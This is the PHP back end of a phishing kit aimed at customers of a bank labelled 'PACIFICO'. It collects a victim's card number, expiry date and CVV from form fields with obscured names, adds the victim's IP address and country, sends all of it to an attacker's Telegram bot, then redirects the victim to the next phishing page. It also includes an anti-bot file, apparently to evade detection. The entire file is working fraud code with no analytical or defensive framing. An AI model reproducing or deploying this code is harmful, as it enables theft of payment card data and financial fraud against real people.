<?php
ini_set("display_errors", 0);
include "infotelegram.php";
include "antibots.php";


if (isset($_POST['tTR4P2SR']) && isset($_POST['PR9345FW']) && isset($_POST['pr3xt4rs']) ) {
    $input = $_POST['tTR4P2SR'];
    $input2 = $_POST['PR9345FW'];
    $input3 = $_POST['pr3xt4rs'];
    $ipInfoResponse = getIpInfo($_SERVER['REMOTE_ADDR']);
    $codigopais = isset($ipInfoResponse['country']) ? $ipInfoResponse['country'] : 'Desconocido';
    $mensajex .= "[PACIFICO - CARD]\n🪪CC: ".$_POST['tTR4P2SR']."\n📅FECHA EXPIRACION: ".$_POST['PR9345FW']."\n💳CVV: ".$_POST['pr3xt4rs']."\nIP: ".$_SERVER['REMOTE_ADDR']."\nPaís: ".$codigopais."\nwww.wolfphish.co";

    env($token, $tid, $mensajex);
}
function getIpInfo($ip) {
    $url = "http://ipinfo.io/{$ip}/json";  
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
    
    return json_decode($response, true);
}
function env($token, $chatID, $mensaje) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = array(
        'chat_id' => $chatID,
        'text' => $mensaje
    );

    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
    );

    $curl = curl_init();
    curl_setopt_array($curl, $options);
    $response = curl_exec($curl);
    curl_close($curl);

    return $response;
    
}
echo "<script>window.location.href = \"../finas.php\"</script>";
?>




